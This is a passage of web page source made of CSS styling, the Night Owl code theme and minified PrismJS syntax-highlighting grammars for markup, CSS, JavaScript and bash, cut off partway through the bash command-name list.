    background: linear-gradient(180deg, rgba(0,255,120,1) 0%, rgba(0,199,94,1) 100%);
    border: 1px solid #7bf77e;
    text-align: center;
    font-weight: 500;

    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    right: 0;
    width: 100%;
}
</style>
<style>
    /**
 * MIT License
 * Copyright (c) 2018 Sarah Drasner
 * Sarah Drasner's[@sdras] Night Owl
 * Ported by Sara vieria [@SaraVieira]
 * Added by Souvik Mandal [@SimpleIndian]
 */

code[class*="language-"],
pre[class*="language-"] {
	color: #d6deeb;
	font-family: Consolas, Monaco, "Andale Mono", "Ubuntu Mono", monospace;
	text-align: left;
	white-space: pre;
	word-spacing: normal;
	word-break: normal;
	word-wrap: normal;
	line-height: 1.5;
	font-size: 0.9em;

	-moz-tab-size: 4;
	-o-tab-size: 4;
	tab-size: 4;

	-webkit-hyphens: none;
	-moz-hyphens: none;
	-ms-hyphens: none;
	hyphens: none;
}

pre[class*="language-"]::-moz-selection,
pre[class*="language-"] ::-moz-selection,
code[class*="language-"]::-moz-selection,
code[class*="language-"] ::-moz-selection {
	text-shadow: none;
	background: rgba(29, 59, 83, 0.99);
}

pre[class*="language-"]::selection,
pre[class*="language-"] ::selection,
code[class*="language-"]::selection,
code[class*="language-"] ::selection {
	text-shadow: none;
	background: rgba(29, 59, 83, 0.99);
}

@media print {
	code[class*="language-"],
	pre[class*="language-"] {
		text-shadow: none;
	}
}

/* Code blocks */
pre[class*="language-"] {
	padding: 1em;
	margin: 0.5em 0;
	overflow: auto;
}

:not(pre) > code[class*="language-"],
pre[class*="language-"] {
	color: white;
	background: #011627;
}

:not(pre) > code[class*="language-"] {
	padding: 0.1em;
	border-radius: 0.3em;
	white-space: normal;
}

.token.comment,
.token.prolog,
.token.cdata {
	color: rgb(99, 119, 119);
	font-style: italic;
}

.token.punctuation {
	color: rgb(199, 146, 234);
}

.namespace {
	color: rgb(178, 204, 214);
}

.token.deleted {
	color: rgba(239, 83, 80, 0.56);
	font-style: italic;
}

.token.symbol,
.token.property {
	color: rgb(128, 203, 196);
}

.token.tag,
.token.operator,
.token.keyword {
	color: rgb(127, 219, 202);
}

.token.boolean {
	color: rgb(255, 88, 116);
}

.token.number {
	color: rgb(247, 140, 108);
}

.token.constant,
.token.function,
.token.builtin,
.token.char {
	color: rgb(130, 170, 255);
}

.token.selector,
.token.doctype {
	color: rgb(199, 146, 234);
	font-style: italic;
}

.token.attr-name,
.token.inserted {
	color: rgb(173, 219, 103);
	font-style: italic;
}

.token.string,
.token.url,
.token.entity,
.language-css .token.string,
.style .token.string {
	color: rgb(173, 219, 103);
}

.token.class-name,
.token.atrule,
.token.attr-value {
	color: rgb(255, 203, 139);
}

.token.regex,
.token.important,
.token.variable {
	color: rgb(214, 222, 235);
}

.token.important,
.token.bold {
	font-weight: bold;
}

.token.italic {
	font-style: italic;
}
</style>
<script>
/* PrismJS 1.29.0
https://prismjs.com/download.html#themes=prism-tomorrow&languages=markup+css+clike+javascript+bash+python+rust */
var _self="undefined"!=typeof window?window:"undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?self:{},Prism=function(e){var n=/(?:^|\s)lang(?:uage)?-([\w-]+)(?=\s|$)/i,t=0,r={},a={manual:e.Prism&&e.Prism.manual,disableWorkerMessageHandler:e.Prism&&e.Prism.disableWorkerMessageHandler,util:{encode:function e(n){return n instanceof i?new i(n.type,e(n.content),n.alias):Array.isArray(n)?n.map(e):n.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/\u00a0/g," ")},type:function(e){return Object.prototype.toString.call(e).slice(8,-1)},objId:function(e){return e.__id||Object.defineProperty(e,"__id",{value:++t}),e.__id},clone:function e(n,t){var r,i;switch(t=t||{},a.util.type(n)){case"Object":if(i=a.util.objId(n),t[i])return t[i];for(var l in r={},t[i]=r,n)n.hasOwnProperty(l)&&(r[l]=e(n[l],t));return r;case"Array":return i=a.util.objId(n),t[i]?t[i]:(r=[],t[i]=r,n.forEach((function(n,a){r[a]=e(n,t)})),r);default:return n}},getLanguage:function(e){for(;e;){var t=n.exec(e.className);if(t)return t[1].toLowerCase();e=e.parentElement}return"none"},setLanguage:function(e,t){e.className=e.className.replace(RegExp(n,"gi"),""),e.classList.add("language-"+t)},currentScript:function(){if("undefined"==typeof document)return null;if("currentScript"in document)return document.currentScript;try{throw new Error}catch(r){var e=(/at [^(\r\n]*\((.*):[^:]+:[^:]+\)$/i.exec(r.stack)||[])[1];if(e){var n=document.getElementsByTagName("script");for(var t in n)if(n[t].src==e)return n[t]}return null}},isActive:function(e,n,t){for(var r="no-"+n;e;){var a=e.classList;if(a.contains(n))return!0;if(a.contains(r))return!1;e=e.parentElement}return!!t}},languages:{plain:r,plaintext:r,text:r,txt:r,extend:function(e,n){var t=a.util.clone(a.languages[e]);for(var r in n)t[r]=n[r];return t},insertBefore:function(e,n,t,r){var i=(r=r||a.languages)[e],l={};for(var o in i)if(i.hasOwnProperty(o)){if(o==n)for(var s in t)t.hasOwnProperty(s)&&(l[s]=t[s]);t.hasOwnProperty(o)||(l[o]=i[o])}var u=r[e];return r[e]=l,a.languages.DFS(a.languages,(function(n,t){t===u&&n!=e&&(this[n]=l)})),l},DFS:function e(n,t,r,i){i=i||{};var l=a.util.objId;for(var o in n)if(n.hasOwnProperty(o)){t.call(n,o,n[o],r||o);var s=n[o],u=a.util.type(s);"Object"!==u||i[l(s)]?"Array"!==u||i[l(s)]||(i[l(s)]=!0,e(s,t,o,i)):(i[l(s)]=!0,e(s,t,null,i))}}},plugins:{},highlightAll:function(e,n){a.highlightAllUnder(document,e,n)},highlightAllUnder:function(e,n,t){var r={callback:t,container:e,selector:'code[class*="language-"], [class*="language-"] code, code[class*="lang-"], [class*="lang-"] code'};a.hooks.run("before-highlightall",r),r.elements=Array.prototype.slice.apply(r.container.querySelectorAll(r.selector)),a.hooks.run("before-all-elements-highlight",r);for(var i,l=0;i=r.elements[l++];)a.highlightElement(i,!0===n,r.callback)},highlightElement:function(n,t,r){var i=a.util.getLanguage(n),l=a.languages[i];a.util.setLanguage(n,i);var o=n.parentElement;o&&"pre"===o.nodeName.toLowerCase()&&a.util.setLanguage(o,i);var s={element:n,language:i,grammar:l,code:n.textContent};function u(e){s.highlightedCode=e,a.hooks.run("before-insert",s),s.element.innerHTML=s.highlightedCode,a.hooks.run("after-highlight",s),a.hooks.run("complete",s),r&&r.call(s.element)}if(a.hooks.run("before-sanity-check",s),(o=s.element.parentElement)&&"pre"===o.nodeName.toLowerCase()&&!o.hasAttribute("tabindex")&&o.setAttribute("tabindex","0"),!s.code)return a.hooks.run("complete",s),void(r&&r.call(s.element));if(a.hooks.run("before-highlight",s),s.grammar)if(t&&e.Worker){var c=new Worker(a.filename);c.onmessage=function(e){u(e.data)},c.postMessage(JSON.stringify({language:s.language,code:s.code,immediateClose:!0}))}else u(a.highlight(s.code,s.grammar,s.language));else u(a.util.encode(s.code))},highlight:function(e,n,t){var r={code:e,grammar:n,language:t};if(a.hooks.run("before-tokenize",r),!r.grammar)throw new Error('The language "'+r.language+'" has no grammar.');return r.tokens=a.tokenize(r.code,r.grammar),a.hooks.run("after-tokenize",r),i.stringify(a.util.encode(r.tokens),r.language)},tokenize:function(e,n){var t=n.rest;if(t){for(var r in t)n[r]=t[r];delete n.rest}var a=new s;return u(a,a.head,e),o(e,a,n,a.head,0),function(e){for(var n=[],t=e.head.next;t!==e.tail;)n.push(t.value),t=t.next;return n}(a)},hooks:{all:{},add:function(e,n){var t=a.hooks.all;t[e]=t[e]||[],t[e].push(n)},run:function(e,n){var t=a.hooks.all[e];if(t&&t.length)for(var r,i=0;r=t[i++];)r(n)}},Token:i};function i(e,n,t,r){this.type=e,this.content=n,this.alias=t,this.length=0|(r||"").length}function l(e,n,t,r){e.lastIndex=n;var a=e.exec(t);if(a&&r&&a[1]){var i=a[1].length;a.index+=i,a[0]=a[0].slice(i)}return a}function o(e,n,t,r,s,g){for(var f in t)if(t.hasOwnProperty(f)&&t[f]){var h=t[f];h=Array.isArray(h)?h:[h];for(var d=0;d<h.length;++d){if(g&&g.cause==f+","+d)return;var v=h[d],p=v.inside,m=!!v.lookbehind,y=!!v.greedy,k=v.alias;if(y&&!v.pattern.global){var x=v.pattern.toString().match(/[imsuy]*$/)[0];v.pattern=RegExp(v.pattern.source,x+"g")}for(var b=v.pattern||v,w=r.next,A=s;w!==n.tail&&!(g&&A>=g.reach);A+=w.value.length,w=w.next){var E=w.value;if(n.length>e.length)return;if(!(E instanceof i)){var P,L=1;if(y){if(!(P=l(b,A,e,m))||P.index>=e.length)break;var S=P.index,O=P.index+P[0].length,j=A;for(j+=w.value.length;S>=j;)j+=(w=w.next).value.length;if(A=j-=w.value.length,w.value instanceof i)continue;for(var C=w;C!==n.tail&&(j<O||"string"==typeof C.value);C=C.next)L++,j+=C.value.length;L--,E=e.slice(A,j),P.index-=A}else if(!(P=l(b,0,E,m)))continue;S=P.index;var N=P[0],_=E.slice(0,S),M=E.slice(S+N.length),W=A+E.length;g&&W>g.reach&&(g.reach=W);var z=w.prev;if(_&&(z=u(n,z,_),A+=_.length),c(n,z,L),w=u(n,z,new i(f,p?a.tokenize(N,p):N,k,N)),M&&u(n,w,M),L>1){var I={cause:f+","+d,reach:W};o(e,n,t,w.prev,A,I),g&&I.reach>g.reach&&(g.reach=I.reach)}}}}}}function s(){var e={value:null,prev:null,next:null},n={value:null,prev:e,next:null};e.next=n,this.head=e,this.tail=n,this.length=0}function u(e,n,t){var r=n.next,a={value:t,prev:n,next:r};return n.next=a,r.prev=a,e.length++,a}function c(e,n,t){for(var r=n.next,a=0;a<t&&r!==e.tail;a++)r=r.next;n.next=r,r.prev=n,e.length-=a}if(e.Prism=a,i.stringify=function e(n,t){if("string"==typeof n)return n;if(Array.isArray(n)){var r="";return n.forEach((function(n){r+=e(n,t)})),r}var i={type:n.type,content:e(n.content,t),tag:"span",classes:["token",n.type],attributes:{},language:t},l=n.alias;l&&(Array.isArray(l)?Array.prototype.push.apply(i.classes,l):i.classes.push(l)),a.hooks.run("wrap",i);var o="";for(var s in i.attributes)o+=" "+s+'="'+(i.attributes[s]||"").replace(/"/g,"&quot;")+'"';return"<"+i.tag+' class="'+i.classes.join(" ")+'"'+o+">"+i.content+"</"+i.tag+">"},!e.document)return e.addEventListener?(a.disableWorkerMessageHandler||e.addEventListener("message",(function(n){var t=JSON.parse(n.data),r=t.language,i=t.code,l=t.immediateClose;e.postMessage(a.highlight(i,a.languages[r],r)),l&&e.close()}),!1),a):a;var g=a.util.currentScript();function f(){a.manual||a.highlightAll()}if(g&&(a.filename=g.src,g.hasAttribute("data-manual")&&(a.manual=!0)),!a.manual){var h=document.readyState;"loading"===h||"interactive"===h&&g&&g.defer?document.addEventListener("DOMContentLoaded",f):window.requestAnimationFrame?window.requestAnimationFrame(f):window.setTimeout(f,16)}return a}(_self);"undefined"!=typeof module&&module.exports&&(module.exports=Prism),"undefined"!=typeof global&&(global.Prism=Prism);
Prism.languages.markup={comment:{pattern:/<!--(?:(?!<!--)[\s\S])*?-->/,greedy:!0},prolog:{pattern:/<\?[\s\S]+?\?>/,greedy:!0},doctype:{pattern:/<!DOCTYPE(?:[^>"'[\]]|"[^"]*"|'[^']*')+(?:\[(?:[^<"'\]]|"[^"]*"|'[^']*'|<(?!!--)|<!--(?:[^-]|-(?!->))*-->)*\]\s*)?>/i,greedy:!0,inside:{"internal-subset":{pattern:/(^[^\[]*\[)[\s\S]+(?=\]>$)/,lookbehind:!0,greedy:!0,inside:null},string:{pattern:/"[^"]*"|'[^']*'/,greedy:!0},punctuation:/^<!|>$|[[\]]/,"doctype-tag":/^DOCTYPE/i,name:/[^\s<>'"]+/}},cdata:{pattern:/<!\[CDATA\[[\s\S]*?\]\]>/i,greedy:!0},tag:{pattern:/<\/?(?!\d)[^\s>\/=$<%]+(?:\s(?:\s*[^\s>\/=]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+(?=[\s>]))|(?=[\s/>])))+)?\s*\/?>/,greedy:!0,inside:{tag:{pattern:/^<\/?[^\s>\/]+/,inside:{punctuation:/^<\/?/,namespace:/^[^\s>\/:]+:/}},"special-attr":[],"attr-value":{pattern:/=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+)/,inside:{punctuation:[{pattern:/^=/,alias:"attr-equals"},{pattern:/^(\s*)["']|["']$/,lookbehind:!0}]}},punctuation:/\/?>/,"attr-name":{pattern:/[^\s>\/]+/,inside:{namespace:/^[^\s>\/:]+:/}}}},entity:[{pattern:/&[\da-z]{1,8};/i,alias:"named-entity"},/&#x?[\da-f]{1,8};/i]},Prism.languages.markup.tag.inside["attr-value"].inside.entity=Prism.languages.markup.entity,Prism.languages.markup.doctype.inside["internal-subset"].inside=Prism.languages.markup,Prism.hooks.add("wrap",(function(a){"entity"===a.type&&(a.attributes.title=a.content.replace(/&amp;/,"&"))})),Object.defineProperty(Prism.languages.markup.tag,"addInlined",{value:function(a,e){var s={};s["language-"+e]={pattern:/(^<!\[CDATA\[)[\s\S]+?(?=\]\]>$)/i,lookbehind:!0,inside:Prism.languages[e]},s.cdata=/^<!\[CDATA\[|\]\]>$/i;var t={"included-cdata":{pattern:/<!\[CDATA\[[\s\S]*?\]\]>/i,inside:s}};t["language-"+e]={pattern:/[\s\S]+/,inside:Prism.languages[e]};var n={};n[a]={pattern:RegExp("(<__[^>]*>)(?:<!\\[CDATA\\[(?:[^\\]]|\\](?!\\]>))*\\]\\]>|(?!<!\\[CDATA\\[)[^])*?(?=</__>)".replace(/__/g,(function(){return a})),"i"),lookbehind:!0,greedy:!0,inside:t},Prism.languages.insertBefore("markup","cdata",n)}}),Object.defineProperty(Prism.languages.markup.tag,"addAttribute",{value:function(a,e){Prism.languages.markup.tag.inside["special-attr"].push({pattern:RegExp("(^|[\"'\\s])(?:"+a+")\\s*=\\s*(?:\"[^\"]*\"|'[^']*'|[^\\s'\">=]+(?=[\\s>]))","i"),lookbehind:!0,inside:{"attr-name":/^[^\s=]+/,"attr-value":{pattern:/=[\s\S]+/,inside:{value:{pattern:/(^=\s*(["']|(?!["'])))\S[\s\S]*(?=\2$)/,lookbehind:!0,alias:[e,"language-"+e],inside:Prism.languages[e]},punctuation:[{pattern:/^=/,alias:"attr-equals"},/"|'/]}}}})}}),Prism.languages.html=Prism.languages.markup,Prism.languages.mathml=Prism.languages.markup,Prism.languages.svg=Prism.languages.markup,Prism.languages.xml=Prism.languages.extend("markup",{}),Prism.languages.ssml=Prism.languages.xml,Prism.languages.atom=Prism.languages.xml,Prism.languages.rss=Prism.languages.xml;
!function(s){var e=/(?:"(?:\\(?:\r\n|[\s\S])|[^"\\\r\n])*"|'(?:\\(?:\r\n|[\s\S])|[^'\\\r\n])*')/;s.languages.css={comment:/\/\*[\s\S]*?\*\//,atrule:{pattern:RegExp("@[\\w-](?:[^;{\\s\"']|\\s+(?!\\s)|"+e.source+")*?(?:;|(?=\\s*\\{))"),inside:{rule:/^@[\w-]+/,"selector-function-argument":{pattern:/(\bselector\s*\(\s*(?![\s)]))(?:[^()\s]|\s+(?![\s)])|\((?:[^()]|\([^()]*\))*\))+(?=\s*\))/,lookbehind:!0,alias:"selector"},keyword:{pattern:/(^|[^\w-])(?:and|not|only|or)(?![\w-])/,lookbehind:!0}}},url:{pattern:RegExp("\\burl\\((?:"+e.source+"|(?:[^\\\\\r\n()\"']|\\\\[^])*)\\)","i"),greedy:!0,inside:{function:/^url/i,punctuation:/^\(|\)$/,string:{pattern:RegExp("^"+e.source+"$"),alias:"url"}}},selector:{pattern:RegExp("(^|[{}\\s])[^{}\\s](?:[^{};\"'\\s]|\\s+(?![\\s{])|"+e.source+")*(?=\\s*\\{)"),lookbehind:!0},string:{pattern:e,greedy:!0},property:{pattern:/(^|[^-\w\xA0-\uFFFF])(?!\s)[-_a-z\xA0-\uFFFF](?:(?!\s)[-\w\xA0-\uFFFF])*(?=\s*:)/i,lookbehind:!0},important:/!important\b/i,function:{pattern:/(^|[^-a-z0-9])[-a-z0-9]+(?=\()/i,lookbehind:!0},punctuation:/[(){};:,]/},s.languages.css.atrule.inside.rest=s.languages.css;var t=s.languages.markup;t&&(t.tag.addInlined("style","css"),t.tag.addAttribute("style","css"))}(Prism);
Prism.languages.clike={comment:[{pattern:/(^|[^\\])\/\*[\s\S]*?(?:\*\/|$)/,lookbehind:!0,greedy:!0},{pattern:/(^|[^\\:])\/\/.*/,lookbehind:!0,greedy:!0}],string:{pattern:/(["'])(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/,greedy:!0},"class-name":{pattern:/(\b(?:class|extends|implements|instanceof|interface|new|trait)\s+|\bcatch\s+\()[\w.\\]+/i,lookbehind:!0,inside:{punctuation:/[.\\]/}},keyword:/\b(?:break|catch|continue|do|else|finally|for|function|if|in|instanceof|new|null|return|throw|try|while)\b/,boolean:/\b(?:false|true)\b/,function:/\b\w+(?=\()/,number:/\b0x[\da-f]+\b|(?:\b\d+(?:\.\d*)?|\B\.\d+)(?:e[+-]?\d+)?/i,operator:/[<>]=?|[!=]=?=?|--?|\+\+?|&&?|\|\|?|[?*/~^%]/,punctuation:/[{}[\];(),.:]/};
Prism.languages.javascript=Prism.languages.extend("clike",{"class-name":[Prism.languages.clike["class-name"],{pattern:/(^|[^$\w\xA0-\uFFFF])(?!\s)[_$A-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\.(?:constructor|prototype))/,lookbehind:!0}],keyword:[{pattern:/((?:^|\})\s*)catch\b/,lookbehind:!0},{pattern:/(^|[^.]|\.\.\.\s*)\b(?:as|assert(?=\s*\{)|async(?=\s*(?:function\b|\(|[$\w\xA0-\uFFFF]|$))|await|break|case|class|const|continue|debugger|default|delete|do|else|enum|export|extends|finally(?=\s*(?:\{|$))|for|from(?=\s*(?:['"]|$))|function|(?:get|set)(?=\s*(?:[#\[$\w\xA0-\uFFFF]|$))|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|static|super|switch|this|throw|try|typeof|undefined|var|void|while|with|yield)\b/,lookbehind:!0}],function:/#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*(?:\.\s*(?:apply|bind|call)\s*)?\()/,number:{pattern:RegExp("(^|[^\\w$])(?:NaN|Infinity|0[bB][01]+(?:_[01]+)*n?|0[oO][0-7]+(?:_[0-7]+)*n?|0[xX][\\dA-Fa-f]+(?:_[\\dA-Fa-f]+)*n?|\\d+(?:_\\d+)*n|(?:\\d+(?:_\\d+)*(?:\\.(?:\\d+(?:_\\d+)*)?)?|\\.\\d+(?:_\\d+)*)(?:[Ee][+-]?\\d+(?:_\\d+)*)?)(?![\\w$])"),lookbehind:!0},operator:/--|\+\+|\*\*=?|=>|&&=?|\|\|=?|[!=]==|<<=?|>>>?=?|[-+*/%&|^!=<>]=?|\.{3}|\?\?=?|\?\.?|[~:]/}),Prism.languages.javascript["class-name"][0].pattern=/(\b(?:class|extends|implements|instanceof|interface|new)\s+)[\w.\\]+/,Prism.languages.insertBefore("javascript","keyword",{regex:{pattern:RegExp("((?:^|[^$\\w\\xA0-\\uFFFF.\"'\\])\\s]|\\b(?:return|yield))\\s*)/(?:(?:\\[(?:[^\\]\\\\\r\n]|\\\\.)*\\]|\\\\.|[^/\\\\\\[\r\n])+/[dgimyus]{0,7}|(?:\\[(?:[^[\\]\\\\\r\n]|\\\\.|\\[(?:[^[\\]\\\\\r\n]|\\\\.|\\[(?:[^[\\]\\\\\r\n]|\\\\.)*\\])*\\])*\\]|\\\\.|[^/\\\\\\[\r\n])+/[dgimyus]{0,7}v[dgimyus]{0,7})(?=(?:\\s|/\\*(?:[^*]|\\*(?!/))*\\*/)*(?:$|[\r\n,.;:})\\]]|//))"),lookbehind:!0,greedy:!0,inside:{"regex-source":{pattern:/^(\/)[\s\S]+(?=\/[a-z]*$)/,lookbehind:!0,alias:"language-regex",inside:Prism.languages.regex},"regex-delimiter":/^\/|\/$/,"regex-flags":/^[a-z]+$/}},"function-variable":{pattern:/#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*[=:]\s*(?:async\s*)?(?:\bfunction\b|(?:\((?:[^()]|\([^()]*\))*\)|(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*)\s*=>))/,alias:"function"},parameter:[{pattern:/(function(?:\s+(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*)?\s*\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\))/,lookbehind:!0,inside:Prism.languages.javascript},{pattern:/(^|[^$\w\xA0-\uFFFF])(?!\s)[_$a-z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*=>)/i,lookbehind:!0,inside:Prism.languages.javascript},{pattern:/(\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\)\s*=>)/,lookbehind:!0,inside:Prism.languages.javascript},{pattern:/((?:\b|\s|^)(?!(?:as|async|await|break|case|catch|class|const|continue|debugger|default|delete|do|else|enum|export|extends|finally|for|from|function|get|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|set|static|super|switch|this|throw|try|typeof|undefined|var|void|while|with|yield)(?![$\w\xA0-\uFFFF]))(?:(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*\s*)\(\s*|\]\s*\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\)\s*\{)/,lookbehind:!0,inside:Prism.languages.javascript}],constant:/\b[A-Z](?:[A-Z_]|\dx?)*\b/}),Prism.languages.insertBefore("javascript","string",{hashbang:{pattern:/^#!.*/,greedy:!0,alias:"comment"},"template-string":{pattern:/`(?:\\[\s\S]|\$\{(?:[^{}]|\{(?:[^{}]|\{[^}]*\})*\})+\}|(?!\$\{)[^\\`])*`/,greedy:!0,inside:{"template-punctuation":{pattern:/^`|`$/,alias:"string"},interpolation:{pattern:/((?:^|[^\\])(?:\\{2})*)\$\{(?:[^{}]|\{(?:[^{}]|\{[^}]*\})*\})+\}/,lookbehind:!0,inside:{"interpolation-punctuation":{pattern:/^\$\{|\}$/,alias:"punctuation"},rest:Prism.languages.javascript}},string:/[\s\S]+/}},"string-property":{pattern:/((?:^|[,{])[ \t]*)(["'])(?:\\(?:\r\n|[\s\S])|(?!\2)[^\\\r\n])*\2(?=\s*:)/m,lookbehind:!0,greedy:!0,alias:"property"}}),Prism.languages.insertBefore("javascript","operator",{"literal-property":{pattern:/((?:^|[,{])[ \t]*)(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*:)/m,lookbehind:!0,alias:"property"}}),Prism.languages.markup&&(Prism.languages.markup.tag.addInlined("script","javascript"),Prism.languages.markup.tag.addAttribute("on(?:abort|blur|change|click|composition(?:end|start|update)|dblclick|error|focus(?:in|out)?|key(?:down|up)|load|mouse(?:down|enter|leave|move|out|over|up)|reset|resize|scroll|select|slotchange|submit|unload|wheel)","javascript")),Prism.languages.js=Prism.languages.javascript;
!function(e){var t="\\b(?:BASH|BASHOPTS|BASH_ALIASES|BASH_ARGC|BASH_ARGV|BASH_CMDS|BASH_COMPLETION_COMPAT_DIR|BASH_LINENO|BASH_REMATCH|BASH_SOURCE|BASH_VERSINFO|BASH_VERSION|COLORTERM|COLUMNS|COMP_WORDBREAKS|DBUS_SESSION_BUS_ADDRESS|DEFAULTS_PATH|DESKTOP_SESSION|DIRSTACK|DISPLAY|EUID|GDMSESSION|GDM_LANG|GNOME_KEYRING_CONTROL|GNOME_KEYRING_PID|GPG_AGENT_INFO|GROUPS|HISTCONTROL|HISTFILE|HISTFILESIZE|HISTSIZE|HOME|HOSTNAME|HOSTTYPE|IFS|INSTANCE|JOB|LANG|LANGUAGE|LC_ADDRESS|LC_ALL|LC_IDENTIFICATION|LC_MEASUREMENT|LC_MONETARY|LC_NAME|LC_NUMERIC|LC_PAPER|LC_TELEPHONE|LC_TIME|LESSCLOSE|LESSOPEN|LINES|LOGNAME|LS_COLORS|MACHTYPE|MAILCHECK|MANDATORY_PATH|NO_AT_BRIDGE|OLDPWD|OPTERR|OPTIND|ORBIT_SOCKETDIR|OSTYPE|PAPERSIZE|PATH|PIPESTATUS|PPID|PS1|PS2|PS3|PS4|PWD|RANDOM|REPLY|SECONDS|SELINUX_INIT|SESSION|SESSIONTYPE|SESSION_MANAGER|SHELL|SHELLOPTS|SHLVL|SSH_AUTH_SOCK|TERM|UID|UPSTART_EVENTS|UPSTART_INSTANCE|UPSTART_JOB|UPSTART_SESSION|USER|WINDOWID|XAUTHORITY|XDG_CONFIG_DIRS|XDG_CURRENT_DESKTOP|XDG_DATA_DIRS|XDG_GREETER_DATA_DIR|XDG_MENU_PREFIX|XDG_RUNTIME_DIR|XDG_SEAT|XDG_SEAT_PATH|XDG_SESSION_DESKTOP|XDG_SESSION_ID|XDG_SESSION_PATH|XDG_SESSION_TYPE|XDG_VTNR|XMODIFIERS)\\b",a={pattern:/(^(["']?)\w+\2)[ \t]+\S.*/,lookbehind:!0,alias:"punctuation",inside:null},n={bash:a,environment:{pattern:RegExp("\\$"+t),alias:"constant"},variable:[{pattern:/\$?\(\([\s\S]+?\)\)/,greedy:!0,inside:{variable:[{pattern:/(^\$\(\([\s\S]+)\)\)/,lookbehind:!0},/^\$\(\(/],number:/\b0x[\dA-Fa-f]+\b|(?:\b\d+(?:\.\d*)?|\B\.\d+)(?:[Ee]-?\d+)?/,operator:/--|\+\+|\*\*=?|<<=?|>>=?|&&|\|\||[=!+\-*/%<>^&|]=?|[?~:]/,punctuation:/\(\(?|\)\)?|,|;/}},{pattern:/\$\((?:\([^)]+\)|[^()])+\)|`[^`]+`/,greedy:!0,inside:{variable:/^\$\(|^`|\)$|`$/}},{pattern:/\$\{[^}]+\}/,greedy:!0,inside:{operator:/:[-=?+]?|[!\/]|##?|%%?|\^\^?|,,?/,punctuation:/[\[\]]/,environment:{pattern:RegExp("(\\{)"+t),lookbehind:!0,alias:"constant"}}},/\$(?:\w+|[#?*!@$])/],entity:/\\(?:[abceEfnrtv\\"]|O?[0-7]{1,3}|U[0-9a-fA-F]{8}|u[0-9a-fA-F]{4}|x[0-9a-fA-F]{1,2})/};e.languages.bash={shebang:{pattern:/^#!\s*\/.*/,alias:"important"},comment:{pattern:/(^|[^"{\\$])#.*/,lookbehind:!0},"function-name":[{pattern:/(\bfunction\s+)[\w-]+(?=(?:\s*\(?:\s*\))?\s*\{)/,lookbehind:!0,alias:"function"},{pattern:/\b[\w-]+(?=\s*\(\s*\)\s*\{)/,alias:"function"}],"for-or-select":{pattern:/(\b(?:for|select)\s+)\w+(?=\s+in\s)/,alias:"variable",lookbehind:!0},"assign-left":{pattern:/(^|[\s;|&]|[<>]\()\w+(?:\.\w+)*(?=\+?=)/,inside:{environment:{pattern:RegExp("(^|[\\s;|&]|[<>]\\()"+t),lookbehind:!0,alias:"constant"}},alias:"variable",lookbehind:!0},parameter:{pattern:/(^|\s)-{1,2}(?:\w+:[+-]?)?\w+(?:\.\w+)*(?=[=\s]|$)/,alias:"variable",lookbehind:!0},string:[{pattern:/((?:^|[^<])<<-?\s*)(\w+)\s[\s\S]*?(?:\r?\n|\r)\2/,lookbehind:!0,greedy:!0,inside:n},{pattern:/((?:^|[^<])<<-?\s*)(["'])(\w+)\2\s[\s\S]*?(?:\r?\n|\r)\3/,lookbehind:!0,greedy:!0,inside:{bash:a}},{pattern:/(^|[^\\](?:\\\\)*)"(?:\\[\s\S]|\$\([^)]+\)|\$(?!\()|`[^`]+`|[^"\\`$])*"/,lookbehind:!0,greedy:!0,inside:n},{pattern:/(^|[^$\\])'[^']*'/,lookbehind:!0,greedy:!0},{pattern:/\$'(?:[^'\\]|\\[\s\S])*'/,greedy:!0,inside:{entity:n.entity}}],environment:{pattern:RegExp("\\$?"+t),alias:"constant"},variable:n.variable,function:{pattern:/(^|[\s;|&]|[<>]\()(?:add|apropos|apt|apt-cache|apt-get|aptitude|aspell|automysqlbackup|awk|basename|bash|bc|bconsole|bg|bzip2|cal|cargo|cat|cfdisk|chgrp|chkconfig|chmod|chown|chroot|cksum|clear|cmp|column|comm|composer|cp|cron|crontab|csplit|curl|cut|date|dc|dd|ddrescue|debootstrap|df|diff|diff3|dig|dir|dircolors|dirname|dirs|dmesg|docker|docker-compose|du|egrep|eject|env|ethtool|expand|expect|expr|fdformat|fdisk|fg|fgrep|file|find|fmt|fold|format|free|fsck|ftp|fuser|gawk|git|gparted|grep|groupadd|groupdel|groupmod|groups|grub-mkconfig|gzip|halt|head|hg|history|host|hostname|htop|iconv|id|ifconfig|ifdown|ifup|import|install|ip|java|jobs|join|kill|killall|less|link|ln|locate|logname|logrotate|look|lpc|lpr|lprint|lprintd|lprintq|lprm|ls|lsof|lynx|make|man|mc|mdadm|mkconfig|mkdir|mke2fs|mkfifo|mkfs|mkisofs|mknod|mkswap|mmv|more|most|mount|mtools|mtr|mutt|mv|nano|nc|netstat|nice|nl|node|nohup|notify-send|npm|nslookup|op|open|parted|passwd|paste|pathchk|ping|pkill|pnpm|podman|podman-compose|popd|pr|printcap|printenv|ps|pushd|pv|quota|quotacheck|quotactl|ram|rar|rcp|reboot|remsync|rename|renice|rev|rm|rmdir|rpm|rsync|scp|screen|sdiff|sed|sendmail|seq|service|sftp|sh|shellcheck|shuf|shutdown|sleep|slocate|sort|split|ssh|stat|strace|su|sudo|sum|suspend|s